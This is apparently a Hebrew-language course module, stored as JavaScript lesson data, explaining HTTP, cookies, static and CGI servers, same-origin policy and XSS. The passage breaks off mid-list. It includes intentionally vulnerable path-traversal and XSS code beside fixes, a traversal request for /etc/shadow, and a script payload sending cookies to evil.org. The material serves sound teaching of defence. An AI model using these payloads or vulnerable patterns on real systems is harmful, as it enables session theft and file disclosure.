UNIT6.sections.push(
  {
    id: "u6-intro",
    title: "מייצר את הדף, ואיפה הקוד רץ",
    html: `
      <p>ביחידה 5 עסקנו ברשת מנקודת מבטה של שכבת התעבורה — שקעי תקשורת (Sockets), חיבורי TCP/UDP ופרוטוקול HTTP הבסיסי. כעת אנו עוברים אל צד השרת ואל תשתיות מחשוב הענן. השאלות המרכזיות כאן הן: מי בונה את התוכן שהדפדפן מקבל, היכן הקוד הזה מתבצע בפועל, וכיצד מבודדים בין משתמשים ולקוחות שונים החולקים את אותה חומרה פיזית.</p>
      
      <p><strong>מושג יסוד — גבול אמון (Trust Boundary):</strong><br>
      גבול אמון הוא קו ההפרדה בין שני רכיבי מערכת בעלי רמות אמון שונות. כל מידע שחוצה גבול זה חייב להיחשב כקלט עוין ובלתי מהימן. הדפדפן של הלקוח שולח מחרוזת טקסט גולמית דרך הרשת. ברגע שהשרת מקבל מחרוזת זו ומפרש אותה — כפקודה במערכת ההפעלה, כשאילתת מסד נתונים, או כקוד להרצה (כגון ב־CGI, במהדר מקוון או בפונקציית <code>exec</code> בפייתון) — הוא עלול לחצות את גבול האמון באופן קטסטרופלי אם לא מופעלים מנגנוני סינון, קידוד ובידוד קשיחים.</p>

      <p>ביחידה 1 הגדרנו <strong>סביבת זמן־ריצה (Run Time Environment)</strong> כסביבה המתווכת בין התוכנית לחומרה (מערכת הפעלה או מכונה וירטואלית). ביחידה זו נבחן כיצד סביבות אלו מאפשרות רמות בידוד שונות — החל משיתוף תהליכים, דרך מכולות (Containers) המשתמשות במרחבי שמות של ליבת מערכת ההפעלה, ועד מכונות וירטואליות (VMs) בעלות ליבה נפרדת לחלוטין המנוהלות על ידי Hypervisor.</p>

      <div class="panel">
        <p><strong>מפת הדרכים של יחידה 6:</strong></p>
        <ul>
          <li><strong>חלק א' — אירוח ואבטחת ווב:</strong> שרת סטטי לעומת CGI דינמי, יישומי רשת מודרניים, מנגנון העוגיות (Cookies), מדיניות המוצא הזהה (SOP), מתקפות הזרקת סקריפטים (XSS) וזיוף בקשות (CSRF), מודלי שירות בענן (IaaS, PaaS, SaaS, FaaS), רשת עמוקה ו־Tor.</li>
          <li><strong>חלק ב' — וירטואליזציה ובידוד בענן:</strong> מכונות וירטואליות (Hypervisor Type 1 מול Type 2) מול מכולות (Containers מבוססי Linux Namespaces ו־cgroups).</li>
          <li><strong>חלק ג' — הרצת קוד זר וממשקים מרוחקים:</strong> מהדרים מקוונים, ארגזי חול (Sandbox), הסכנות בהרצת <code>exec()</code> בפייתון ועקיפת ארגז חול ברפלקציה (Reflection Escape), וקריאה לפרוצדורות מרוחקות (RPC/RMI).</li>
        </ul>
      </div>
    `,
  },
  {
    id: "u6-http",
    title: "HTTP: בקשה, תשובה, GET ו־POST",
    html: `
      <p>דפדפן ושרת מתקשרים ביניהם באמצעות פרוטוקול <strong>HTTP (Hypertext Transfer Protocol)</strong> — פרוטוקול טקסטואלי במודל בקשה–תשובה (Request-Response). הלקוח שולח הודעת בקשה, והשרת משיב בהודעת תשובה. כאשר שכבת התקשורת מוצפנת ומאומתת באמצעות פרוטוקול TLS, הפרוטוקול מכונה <strong>HTTPS (HTTP Secure)</strong>.</p>

      <h3>1. מבנה בקשת HTTP (HTTP Request)</h3>
      <p>הבקשה מורכבת משלושה חלקים עיקריים: <strong>שורת הבקשה (Request Line)</strong>, <strong>כותרות הבקשה (Headers)</strong>, ו<strong>גוף הבקשה (Body)</strong> (אופציונלי):</p>

      <pre class="code"><code>GET /catalog/items?category=hardware&amp;sort=price HTTP/1.1
Host: store.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml
Cookie: session_id=f4c7e82a901b3c8d
Connection: keep-alive</code></pre>

      <p><strong>ניתוח שורות הבקשה:</strong></p>
      <ul>
        <li><strong>שורת הבקשה הראשונה:</strong> כוללת שלושה רכיבים:
          <ol>
            <li><strong>שיטת הבקשה (HTTP Method):</strong> הפעולה המבוקשת (למשל <code>GET</code> לשליפה, <code>POST</code> לשליחת נתונים, <code>PUT</code> לעדכון, <code>DELETE</code> למחיקה).</li>
            <li><strong>נתיב המשאב (Request Target / Path &amp; Query):</strong> הנתיב <code>/catalog/items</code> בצירוף מחרוזת שאילתה (Query String) המתחילה בתו <code>?</code> ומכילה פרמטרים בצורת <code>מפתח=ערך</code>.</li>
            <li><strong>גרסת הפרוטוקול:</strong> למשל <code>HTTP/1.1</code>.</li>
          </ol>
        </li>
        <li><strong>כותרת <code>Host</code>:</strong> מציינת את שם הדומיין המבוקש (<code>store.example.com</code>). כותרת זו היא <strong>חובה ב־HTTP/1.1</strong>, מכיוון ששרת פיזי יחיד בעל כתובת IP אחת יכול לארח מאות אתרים שונים (מנגנון <strong>אירוח וירטואלי — Virtual Hosting</strong>). בלי כותרת זו, השרת אינו יכול לדעת לאיזה אתר הבקשה מיועדת!</li>
        <li><strong>כותרת <code>Cookie</code>:</strong> מחרוזת זיהוי שהדפדפן מצרף אוטומטית לבקשה, המאפשרת לשרת לזהות את המשתמש.</li>
      </ul>

      <h3>2. מבנה תשובת HTTP (HTTP Response)</h3>
      <p>התשובה מורכבת מ<strong>שורת המעמד (Status Line)</strong>, <strong>כותרות התשובה</strong>, ו<strong>גוף התשובה (Response Body)</strong> המכיל את המידע המוחזר (HTML, JSON, קובץ תמונה וכד'):</p>

      <pre class="code"><code>HTTP/1.1 200 OK
Date: Tue, 06 Oct 2026 14:00:00 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1420
Set-Cookie: session_id=f4c7e82a901b3c8d; Path=/; Secure; HttpOnly; SameSite=Strict

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;חנות מוצרים&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;&lt;h1&gt;רשימת חומרה&lt;/h1&gt;...&lt;/body&gt;
&lt;/html&gt;</code></pre>

      <p><strong>קודי מעמד (HTTP Status Codes) — חלוקה למשפחות:</strong></p>
      <ul>
        <li><strong>2xx (הצלחה — Success):</strong> למשל <code>200 OK</code> (הבקשה הצליחה והתוכן מוחזר), <code>201 Created</code> (נוצר משאב חדש בהצלחה).</li>
        <li><strong>3xx (הפניה — Redirection):</strong> למשל <code>301 Moved Permanently</code> (המשאב הועבר לצמיתות לכתובת חדשה), <code>302 Found</code> (הפניה זמנית).</li>
        <li><strong>4xx (שגיאת לקוח — Client Error):</strong> הלקוח שלח בקשה שגויה. למשל <code>400 Bad Request</code> (תחביר שגוי), <code>401 Unauthorized</code> (המשתמש אינו מזוהה / נדרש אימות), <code>403 Forbidden</code> (המשתמש מזוהה אך אין לו הרשאה למשאב), <code>404 Not Found</code> (המשאב לא נמצא).</li>
        <li><strong>5xx (שגיאת שרת — Server Error):</strong> השרת נכשל בעיבוד בקשה תקינה. למשל <code>500 Internal Server Error</code> (קריסה או שגיאה בלוגיקת השרת), <code>502 Bad Gateway</code> (שרת פרוקסי קיבל תשובה לא תקינה משרת פנימי), <code>503 Service Unavailable</code> (עומס יתר או תחזוקה).</li>
      </ul>

      <h3>3. ההבדלים המרכזיים בין GET לבין POST</h3>
      <table class="tbl">
        <thead>
          <tr>
            <th>מאפיין</th>
            <th>שיטת GET</th>
            <th>שיטת POST</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>מיקום הפרמטרים</strong></td>
            <td>בתוך כתובת ה־URL עצמה (Query String, למשל <code>/search?q=laptop</code>).</td>
            <td>בגוף הבקשה (Request Body).</td>
          </tr>
          <tr>
            <td><strong>מטרת השימוש</strong></td>
            <td>שליפת מידע בלבד (Safe &amp; Idempotent — פעולה שאינה משנה מצב בשרת).</td>
            <td>שינוי מצב בשרת (יצירת רשומה, עדכון, מחיקה, תשלום, התחברות).</td>
          </tr>
          <tr>
            <td><strong>היסטוריה ושמירה בסימניות</strong></td>
            <td>נשמר בהיסטוריית הדפדפן, ביומני שרת (Logs) ובסימניות (Bookmarks).</td>
            <td>אינו נשמר בהיסטוריה או בסימניות; שליחה מחדש דורשת אישור משתמש.</td>
          </tr>
          <tr>
            <td><strong>היבט אבטחתי קריטי</strong></td>
            <td><strong>מוקש בחינה:</strong> לעולם אין להעביר סיסמאות, פרטי אשראי או טוקנים סודיים ב־GET! הכתובת נשמרת בגלוי ביומני גישה (Access Logs) של פרוקסים ושרתים.</td>
            <td>מתאים לנתונים רגישים (כאשר מועבר מעל HTTPS). <em>דגש:</em> גם ב־POST, כל הנתונים מגיעים מהלקוח וחובה לאמתם ולסננם בשרת!</td>
          </tr>
        </tbody>
      </table>

      <h3>4. ניהול מושב (Session Management) ועוגיות (Cookies)</h3>
      <p>פרוטוקול HTTP הוא <strong>חסר מצב (Stateless)</strong> — השרת אינו שומר בזיכרון את הבקשות הקודמות של הלקוח, ואינו "זוכר" מיהו מרגע שנשלחה התשובה. כל בקשה חדשה מגיעה כזרה לחלוטין. כדי לאפשר חוויית שימוש רציפה (כגון הישארות בחשבון מחובר או עגלת קניות), יש לבנות שכבת <strong>מושב (Session)</strong> מעל ה־HTTP.</p>
      
      <p><strong>כיצד פועל מנגנון העוגיות?</strong></p>
      <ol>
        <li>לאחר אימות ראשוני (שם משתמש וסיסמה), השרת מייצר מחרוזת אקראית קריפטוגרפית בעלת אנטרופיה גבוהה — <strong>מזהה מושב (Session ID)</strong>.</li>
        <li>השרת שומר במאגר נתונים פנימי (בזיכרון או במסד נתונים) את הנתונים המשויכים למזהה זה (זהות המשתמש, הרשאות, תוקף).</li>
        <li>השרת שולח את מזהה המושב לדפדפן בכותרת <code>Set-Cookie</code>.</li>
        <li>הדפדפן שומר את העוגיה ומאותו רגע מצרף אותה <em>אוטומטית</em> לכל בקשה עתידית המופנית לאותו דומיין.</li>
      </ol>

      <p><strong>מוקש בחינה: עוגיית מושב היא סוד קריטי!</strong> כל מי שמחזיק בעוגיית המושב נחשב בעיני השרת למשתמש עצמו! גניבת עוגיה נקראת <strong>חטיפת מושב (Session Hijacking)</strong>. השרת חייב לשמור את כל המידע וההרשאות בשרת עצמו — לעולם אין לשמור בעוגיה הרשאות פתוחות שהלקוח יכול לערוך (כגון <code>role=admin</code>).</p>

      <h3>5. דגלי אבטחה לעוגיות (Cookie Security Flags)</h3>
      <ul>
        <li><code>HttpOnly</code> — מורה לדפדפן לחסום גישה לעוגיה מתוך קוד JavaScript של צד הלקוח (דרך <code>document.cookie</code>). זהו קו הגנה קריטי: גם אם תוקף הצליח להזריק קוד סקריפט לאתר (מתקפת <strong>XSS — Cross-Site Scripting</strong>), הדגל ימנע ממנו לקרוא את העוגיה ולחטוף את המושב.</li>
        <li><code>Secure</code> — מורה לדפדפן לשלוח את העוגיה <em>אך ורק</em> בערוץ תקשורת מוצפן (HTTPS). הדגל מונע מהעוגיה לזלוג בטקסט גלוי לרשת במקרה של גלישה ברשת אלחוטית פתוחה או שילוב תוכן בלתי מוצפן.</li>
        <li><code>SameSite</code> — קובע האם הדפדפן יצרף את העוגיה לבקשות שמקורן באתרים אחרים (Cross-Site Requests). זהו קו ההגנה המובנה של הדפדפן כנגד מתקפות <strong>זיוף בקשות חוצות־אתרים (CSRF — Cross-Site Request Forgery)</strong>:
          <ul>
            <li><code>SameSite=Strict</code> — העוגיה לעולם לא תישלח בבקשה שמקורה באתר חיצוני, אפילו אם המשתמש לחץ על קישור תמים שהוביל לאתר. זוהי רמת ההגנה המרבית.</li>
            <li><code>SameSite=Lax</code> (ברירת המחדל בדפדפנים מודרניים) — העוגיה נשלחת במעבר קישור ישיר רגיל (בקשת GET ברמת הניווט העליונה), אך נחסמת לחלוטין בשליחת טפסים (POST) או בקריאות רשת אסינכרוניות ברקע (כגון <code>fetch</code> או AJAX) מאתר זר.</li>
            <li><code>SameSite=None</code> — העוגיה תישלח בכל פנייה, כולל בקשות חוצות־אתרים (דפדפנים מחייבים להגדיר לצידה את הדגל <code>Secure</code>).</li>
          </ul>
        </li>
      </ul>
      <div class="panel">
        <p><strong>למה המזהה יושב בשרת.</strong> HTTP שוכח אתכם אחרי כל תשובה, כמו דלפק שירות בלי כרטיס תור. העוגיה היא כרטיס התור: מספר מזהה בלבד, ולא תיאור של מי אתם. השרת שומר במגירה הסודית שלו למי שייך המספר. אם רושמים על הכרטיס עצמו שהמחזיק בו הוא מנהל מערכת, הלקוח יכול לשנות את הכיתוב. לכן האמת וההרשאות נשארות במגירה בשרת, ועל הכרטיס מופיע רק מזהה אקראי קשה לניחוש.</p>
      </div>
    `,
  },
  {
    id: "u6-static",
    title: "שרת אינטרנט סטטי (Web server)",
    html: `
      <p><strong>שרת אינטרנט סטטי (Static Web Server):</strong> תוכנת שרת המממשת את פרוטוקול HTTP, שבה כל קובצי האתר (דפי HTML, תמונות, קובצי CSS וסקריפטים) כבר קיימים ומוכנים מראש על גבי מדיית האחסון (הדיסק). כאשר מתקבלת בקשת HTTP, השרת ממפה את נתיב הבקשה (URI) לנתיב של קובץ במערכת הקבצים ומחזיר את תוכן הקובץ כבתים גולמיים. אין כאן שום חישוב מותאם אישית למשתמש מעבר לבחירת הקובץ ובדיקת הרשאות קריאה.</p>

      <h3>1. עקרון הפעולה ומיפוי נתיבים</h3>
      <p>השרת מגדיר תיקיית שורש מורשית עבור מסמכי האתר המכונה <strong>שורש המסמכים (Document Root / Web Root)</strong>, למשל <code>/var/www/site_assets</code>. כאשר מגיעה בקשה עבור <code>GET /catalog/styles.css HTTP/1.1</code>, השרת משרשר את הנתיב לשורש: <code>/var/www/site_assets/catalog/styles.css</code>, קורא את הקובץ ושולח אותו ללקוח בצירוף כותרת הסוג המתאים (MIME Type: <code>Content-Type: text/css</code>).</p>

      <h3>2. מוקש האבטחה המרכזי: מעבר נתיבים (Path Traversal / Directory Traversal)</h3>
      <p>הנתיב שנשלח בבקשת ה־HTTP הוא קלט לקוח לכל דבר ועניין! אם השרת מבצע שרשור תמים של הנתיב לנתיב השורש ללא בדיקה, תוקף יכול להחדיר רצפי תווים מיוחדים כגון <code>..</code> (המסמל במערכות קבצים "עלייה ספרייה אחת למעלה"):</p>

      <pre class="code"><code># קוד שרת סטטי נאיבי ופגיע למעבר נתיבים (Path Traversal):
import os

WEB_ROOT = "/var/www/site_assets"

def handle_static_request(requested_path):
    # שרשור תמים של קלט מהלקוח לנתיב התיקייה
    full_path = os.path.join(WEB_ROOT, requested_path.lstrip("/"))
    # אסון אבטחתי: אם הנתיב מכיל ../.. ניתן לקרוא כל קובץ בשרת!
    with open(full_path, "rb") as f:
        return f.read()</code></pre>

      <p>אם התוקף שולח בקשה כגון: <code>GET /../../../../etc/shadow HTTP/1.1</code>, פונקציית <code>os.path.join</code> מחברת את המחרוזת כך שהנתיב יוצא מחוץ לתיקיית <code>WEB_ROOT</code> ומאפשר לתוקף לקרוא קובצי מערכת רגישים (קובצי סיסמאות, קובצי הגדרות, מפתחות פרטיים).</p>

      <h3>3. הפתרון ההגנתי הנכון</h3>
      <p>כדי למנוע מעבר נתיבים, חובה לבצע <strong>נרמול ופישוט נתיב (Path Normalization / Canonicalization)</strong> ולוודא שהנתיב הסופי נשאר בהכרח תחת ספריית השורש:</p>

      <pre class="code"><code># מיפוי מאובטח המגן מפני מעבר נתיבים:
import os

WEB_ROOT = "/var/www/site_assets"

def safe_handle_static_request(requested_path):
    # 1. חישוב הנתיב הקנוני המוחלט של ספריית השורש
    canonical_root = os.path.realpath(WEB_ROOT)
    
    # 2. נרמול ופישוט מלא של הנתיב המבוקש (הסרת קישורים סמבוליים ו-..)
    target_path = os.path.realpath(os.path.join(WEB_ROOT, requested_path.lstrip("/")))
    
    # 3. בדיקה קשיחה שהנתיב המבוקש מתחיל בנתיב ספריית השורש
    if not target_path.startswith(canonical_root + os.sep):
        raise PermissionError("Access Denied: Path traversal attempt detected")
        
    with open(target_path, "rb") as f:
        return f.read()</code></pre>

      <div class="panel">
        <p><strong>עקרון הרשאת המינימום (Least Privilege) בשרת סטטי:</strong> מעבר להגנה בקוד, תהליך השרת עצמו חייב לרוץ תחת משתמש ייעודי חסר הרשאות במערכת ההפעלה (כגון משתמש <code>www-data</code> או <code>nobody</code>), כאשר למשתמש זה מוענקות אך ורק הרשאות קריאה (Read-Only) לקובצי ספריית האתר, ללא הרשאות כתיבה וללא גישה לשאר קובצי המערכת.</p>
      </div>
    `,
  },
  {
    id: "u6-cgi",
    title: "ממשק שער משותף (CGI) — דינמי",
    html: `
      <p>שרת סטטי מחזיר קובץ שכבר נכתב מראש לדיסק. ברגע שגוף התשובה תלוי בבקשה ובקלט המשתמש (למשל תוצאות חיפוש, חישוב מחיר סל, או שליפת נתונים מותאמת אישית), השרת אינו יכול להסתפק בהחזרת קובץ מוכן — הוא נדרש <strong>להפעיל תוכנית</strong>. זהו המעבר ל־CGI.</p>

      <p><strong>ממשק שער משותף (CGI — Common Gateway Interface):</strong> תקן המגדיר כיצד שרת אינטרנט מתקשר עם תוכניות חיצוניות לצורך הפקת תוכן <em>דינמי</em>. השרת אינו מייצר את גוף התשובה בעצמו: הוא מקבל את בקשת ה־HTTP, מפעיל תהליך חדש של תוכנית חיצונית (סקריפט בפייתון, בפרל, או בינארי ב־C), מעביר לה את פרטי הבקשה, והתוכנית כותבת את תשובת ה־HTTP לפלט התקני שלה (Standard Output — <code>stdout</code>), הנשלח ישירות ללקוח.</p>

      <h3>1. מנגנון העברת הנתונים ב־CGI</h3>
      <p>במודל ה־CGI הקלאסי, השרת מעביר לתוכנית את נתוני הבקשה דרך <strong>משתני סביבה (Environment Variables)</strong> ודרך הצינור התקני (<code>stdin</code>):</p>
      <ul>
        <li><code>REQUEST_METHOD</code> — שיטת הבקשה שנשלחה (<code>GET</code> או <code>POST</code>).</li>
        <li><code>QUERY_STRING</code> — כל המחרוזת המופיעה אחרי סימן השאלה בכתובת ה־URL (למשל <code>product=keyboard&amp;limit=10</code>). זהו טקסט שנבחר ומולא על ידי הלקוח!</li>
        <li><code>CONTENT_LENGTH</code> — מספר הבתים המדויק שנשלח בגוף הבקשה (בבקשות <code>POST</code>). התוכנית קוראת מ־<code>stdin</code> בדיוק את כמות הבתים הזו, כדי למנוע חריגת קריאה מעבר לגבולות החוצץ.</li>
        <li><code>CONTENT_TYPE</code> — סוג הנתונים המועברים בגוף (למשל <code>application/x-www-form-urlencoded</code>).</li>
        <li><code>PATH_INFO</code> ו־<code>SCRIPT_NAME</code> — מידע על נתיב הסקריפט והמשאב המבוקש.</li>
      </ul>

      <h3>2. דוגמת קוד: סקריפט CGI בפייתון וניתוח זרימת המידע</h3>
      <pre class="code"><code>#!/usr/bin/env python3
import os
import sys
import urllib.parse
import html

# 1. שליפת מטא-נתונים ממשתני הסביבה
method = os.environ.get("REQUEST_METHOD", "GET")
query_string = os.environ.get("QUERY_STRING", "")

# 2. קריאת גוף הבקשה אם מדובר ב-POST
body = ""
if method == "POST":
    content_length = int(os.environ.get("CONTENT_LENGTH", 0))
    if content_length > 0:
        body = sys.stdin.read(content_length)

# 3. פענוח הפרמטרים מה-URL או מהגוף
raw_data = query_string if method == "GET" else body
params = urllib.parse.parse_qs(raw_data)
user_query = params.get("search", [""])[0]

# 4. הדפסת כותרות HTTP לפלט התקני (stdout)
print("Content-Type: text/html; charset=UTF-8")
print()  # שורה ריקה חובה המפרידה לפי התקן בין הכותרות לגוף התשובה!

# 5. קידוד ישויות פלט להגנה מפני הזרקת קוד (XSS)
safe_query = html.escape(user_query)
print(f"&lt;html&gt;&lt;body&gt;&lt;h1&gt;תוצאות עבור: {safe_query}&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;")</code></pre>

      <h3>3. היבטי אבטחה ומוקשי בחינה ב־CGI</h3>
      <ul>
        <li><strong>משתני הסביבה הם קלט לקוח עוין:</strong> משתני סביבה כמו <code>QUERY_STRING</code> או נתוני <code>stdin</code> אינם נתונים פנימיים של השרת, אלא טקסט גולמי שנוצר על ידי גורם חיצוני. שרשור שלהם לתוך שאילתת SQL יוצר הזרקת SQL (יחידה 7); שרשור לפקודות מערכת דרך <code>os.system</code> גורר הזרקת פקודות מערכת (Command Injection); והדפסה ישירה לדף ללא קידוד ישויות גוררת הרצת סקריפטים זדוניים (XSS).</li>
        <li><strong>תקורה כבדה וסכנת מניעת שירות (DoS):</strong> במודל CGI קלאסי, השרת יוצר תהליך מערכת הפעלה חדש (<span dir="ltr"><code>fork</code> + <code>exec</code></span>) עבור <em>כל בקשת HTTP בודדת</em>! יצירת תהליך דורשת הקצאת זיכרון, טעינת ספריות והפעלת מפרש השפה. תחת מתקפת הצפה (DDoS) או עומס משתמשים כבד, השרת ייפול במהירות עקב אזילת משאבי זיכרון או הגעה למגבלת התהליכים המרבית של מערכת ההפעלה (Process Table Exhaustion).</li>
        <li><strong>המעבר לשרתי יישומים מודרניים:</strong> בשל התקורה הכבדה של CGI, פותחו פתרונות כגון FastCGI ושרתי יישומים מודרניים (כגון Gunicorn ו־uWSGI בפייתון, או Node.js). מודלים אלו מחזיקים מאגר תהליכים חיים (Worker Pool) או לולאת אירועים (Event Loop) המטפלים באלפי בקשות במקביל ברציפות, ללא צורך ביצירת תהליך חדש מאפס בכל פנייה.</li>
      </ul>

      <div class="panel">
        <p><strong>ההבחנה המרכזית לבחינה:</strong> מי מייצר את גוף התשובה, ואיפה בודקים את המחרוזת מהלקוח?<br>
        <strong>שרת סטטי:</strong> ארון תיקים. הקבצים מוכנים בדיסק. בדיקת הקלט מתמקדת בנתיב המבוקש ובמניעת מעבר נתיבים.<br>
        <strong>CGI:</strong> פקיד חדש שנוצר מאפס לכל שאלה. יקר ואיטי. כל פרמטר ב־<code>QUERY_STRING</code> או ב־<code>stdin</code> הוא קלט שיש לאמת ולסנן.<br>
        <strong>יישום רשת מודרני:</strong> שרת קבוע המחזיק תהליכים פעילים, מסדי נתונים, וניהול מושב מתמשך מעל עוגיות ואסימונים.</p>
      </div>
    `,
  },
  {
    id: "u6-webapp",
    title: "יישום רשת (Web application) ואבטחת ווב: SOP,‏ XSS ו־CSRF",
    html: `
      <p><strong>יישום רשת (Web application)</strong> הוא מערכת תוכנה דינמית ואינטראקטיבית הפועלת במודל שרת–לקוח. להבדיל מסקריפט CGI בודד שמופעל מחדש בכל בקשה ונעלם מיד, שרת היישומים מנהל לוגיקה עסקית רציפה (Business Logic), שומר חיבורים למסדי נתונים, ומנהל <strong>מושב משתמש (Session)</strong> מתמשך באמצעות עוגיות או אסימונים. במקביל, הדפדפן מריץ קוד JavaScript עשיר בצד הלקוח. שילוב זה יוצר חוויית משתמש מהירה, אך מחייב מודל אבטחה קפדני בדפדפן שיבודד בין אתרים שונים לחלוטין.</p>
      
      <h3>1. מדיניות המוצא הזהה (Same-Origin Policy — SOP)</h3>
      <p><strong>מדוע הדפדפן זקוק לבידוד?</strong> דמיינו שאתם גולשים בשתי לשוניות במקביל: בלשונית אחת פתוח אתר הבנק שלכם (<code>bank.example.com</code>), ובלשונית שנייה פתחתם אתר משחקים לא מוכר (<code>games.example.org</code>). ללא מנגנון הגנה בדפדפן, סקריפט ה־JavaScript שרץ באתר המשחקים היה יכול לגשת אל לשונית הבנק, לקרוא את יתרת החשבון שלכם, להעתיק את הסיסמה או לגנוב את עוגיית ההתחברות! כדי למנוע אסון זה, כל דפדפן מודרני אוכף את <strong>מדיניות המוצא הזהה (Same-Origin Policy — SOP)</strong> — חומת מגן בלתי נראית המבודדת בין אתרים שונים.</p>
      
      <p><strong>מהו מוצא (Origin)?</strong> שלישייה קבועה המוגדרת על פי <code>(פרוטוקול, שם מארח/דומיין, שער/פורט)</code>:</p>
      <ul>
        <li><code>http://shop.example.com/item1</code> ו־<code>http://shop.example.com/item2</code> — <strong>אותו מוצא (Same Origin)</strong> (אותו פרוטוקול http, אותו דומיין shop.example.com, ואותו פורט 80 ברירת מחדל).</li>
        <li><code>https://shop.example.com/item1</code> ו־<code>http://shop.example.com/item1</code> — <strong>מוצא שונה (Cross Origin)</strong> (פרוטוקול מוצפן https לעומת http).</li>
        <li><code>http://sub.example.com</code> ו־<code>http://example.com</code> — <strong>מוצא שונה</strong> (שם מארח/תת־דומיין שונה).</li>
        <li><code>http://example.com:80</code> ו־<code>http://example.com:8080</code> — <strong>מוצא שונה</strong> (פורט שונה).</li>
      </ul>
      <p>אם קיים הבדל אפילו באחד משלושת המרכיבים הללו — הדפדפן מכריז על שני המקורות כבעלי <strong>מוצא שונה</strong> ומונע גישה ישירה ביניהם!</p>

      <p><strong>מה ה־SOP חוסם ומה הוא מתיר?</strong></p>
      <ul>
        <li><strong>קריאה וגישה ישירה נחסמות לחלוטין (No Read):</strong>
          <pre class="code"><code>// קוד הרץ ב-evil.com ומנסה לקרוא נתונים מ-bank.example.com:
fetch("https://bank.example.com/api/balance")
  .then(res => res.json())
  .then(data => console.log(data));
// תוצאה בדפדפן: השגיאה נחסמת על ידי ה-SOP!
// הדפדפן אוסר על הסקריפט של evil.com לקרוא את תוכן התשובה!</code></pre>
          סקריפט מאתר A אינו מורשה לקרוא את עץ ה־DOM של אתר B, אינו יכול לקרוא את עוגיות המושב שלו (<code>document.cookie</code>), את האחסון המקומי (Local Storage), ואינו יכול לקרוא תשובות לבקשות רשת.
        </li>
        <li><strong>שיתוף מבוקר דרך CORS:</strong> מנגנון <strong>שיתוף משאבים בין מקורות (Cross-Origin Resource Sharing — CORS)</strong> מאפשר לשרת היעד להקל על מגבלת ה־SOP בצורה מבוקרת, באמצעות כותרת HTTP (כגון <code>Access-Control-Allow-Origin: https://site-a.com</code>) המאשרת מפורשות לאתרים ספציפיים לקרוא את התשובה.</li>
        <li><strong>החריג הקריטי — שליחת בקשות מותרת (Write Allowed):</strong> הדפדפן מתיר להטמיע משאבים פסיביים (תמונות ב־<code>&lt;img&gt;</code>, סקריפטים ב־<code>&lt;script&gt;</code>), וחשוב מכל: <em>הוא מתיר לשלוח טפסים ובקשות רשת לאתר אחר!</em> הדפדפן מאפשר לשלוח פעולה (Write), אך חוסם את היכולת לקרוא את התשובה (Read). הבדל עדין זה הוא בדיוק הבסיס שמאפשר את מתקפת ה־CSRF!</li>
      </ul>

      <h3>2. מתקפת תסריט חוצה־אתרים / הזרקת קוד (XSS — Cross-Site Scripting)</h3>
      <p>אם מדיניות ה־SOP מבודדת בין אתרים שונים, כיצד תוקף יכול לפגוע במשתמשי האתר? במתקפת <strong>XSS</strong> התוקף אינו תוקף מבחוץ — הוא <em>מזריק קוד JavaScript זדוני ישירות לתוך הדף של האתר האמין שלנו!</em></p>
      <p>כאשר הדפדפן של הקורבן טוען את הדף מאתר הבנק, והדף מכיל את הסקריפט שהתוקף הצליח להשתיל, הדפדפן מזהה שהסקריפט רץ תחת ה־Origin החוקי של אתר הבנק. לפיכך, <strong>מתקפת XSS עוקפת לחלוטין את ה־SOP</strong> — משום שהסקריפט רץ כחלק מובנה מהאתר עצמו!</p>
      
      <p><strong>שלושת סוגי ה־XSS (הבחנה מרכזית לבחינה):</strong></p>
      
      <h4>א. הזרקה משוקפת (Reflected XSS):</h4>
      <p>הקוד הזדוני אינו נשמר במסד הנתונים, אלא "משתקף" בחזרה מהשרת בתשובה לאותה בקשה. השרת מקבל קלט מה־URL ומדפיס אותו ישירות לדף ללא קידוד ישויות:</p>
      <pre class="code"><code># קוד שרת פגיע להזרקה משוקפת (Reflected XSS):
from flask import Flask, request
app = Flask(__name__)

@app.route("/search")
def search():
    user_query = request.args.get("q", "")
    # אסון אבטחתי: שרשור קלט גולמי ישירות לתוך ה-HTML
    return f"&lt;h1&gt;תוצאות חיפוש עבור: {user_query}&lt;/h1&gt;"</code></pre>
      <p>התוקף מפתה את הקורבן ללחוץ על קישור זדוני המכיל מטען תקיפה (Payload):<br>
      <code>https://site.example.com/search?q=&lt;script&gt;fetch('https://evil.org/steal?cookie='+document.cookie)&lt;/script&gt;</code><br>
      שרת האתר משקף את הסקריפט לתוך דף התשובה, והדפדפן של הקורבן מריץ אותו ושולח את עוגיית המושב אל שרת התוקף!</p>

      <h4>ב. הזרקה שמורה / מתמשכת (Stored / Persistent XSS):</h4>
      <p>הקוד הזדוני נשמר לצמיתות בבסיס הנתונים של השרת (למשל כחלק מתגובה בפורום, ביקורת על מוצר או שם משתמש בפרופיל). כל משתמש תמים שגולש לעמוד זה מקבל מהשרת את הקוד הזדוני ומריץ אותו אוטומטית בדפדפן שלו. זוהי הצורה החמורה ביותר של XSS, כיוון שהיא פוגעת בהמוני גולשים ללא צורך בלחיצה על קישור מיוחד.</p>

      <h4>ג. הזרקה מבוססת מודל המסמך (DOM-based XSS):</h4>
      <p>במתקפה זו השרת כלל אינו מעורב ואינו רואה את הקוד הזדוני! הפגיעות מתרחשת כולה בצד הלקוח בדפדפן. סקריפט JavaScript של האתר קורא נתון לא בטוח ממקור קלט (<strong>Source</strong> — כגון <code>location.search</code>) ושותל אותו ישירות לתוך פונקציה מסוכנת או מאפיין שמפרש אותו כקוד להרצה (<strong>Sink</strong> — כגון <code>element.innerHTML</code> או <code>eval</code>):</p>
      <pre class="code"><code>// קוד צד-לקוח פגיע ב-JavaScript:
const params = new URLSearchParams(window.location.search);
const userName = params.get("user"); // Source: קלט מה-URL שאינו מהימן
// Sink מסוכן המפרש מחרוזת כקוד HTML/JS:
document.getElementById("greeting").innerHTML = "שלום, " + userName;

// התיקון המאובטח: שימוש ב-Sink שאינו מפרש קוד (מציג טקסט גולמי בלבד):
document.getElementById("greeting").textContent = "שלום, " + userName;</code></pre>

      <p><strong>אמצעי הגנה מפני XSS (לפי דרישות הקורס):</strong></p>
      <ol>
        <li><strong>קידוד פלט מותאם־הקשר (Context-aware Output Encoding / Escaping):</strong>
          קו ההגנה הראשי. במקום להדפיס תווי קלט כפי שהם, ממירים תווים מיוחדים לישויות HTML בטוחות:
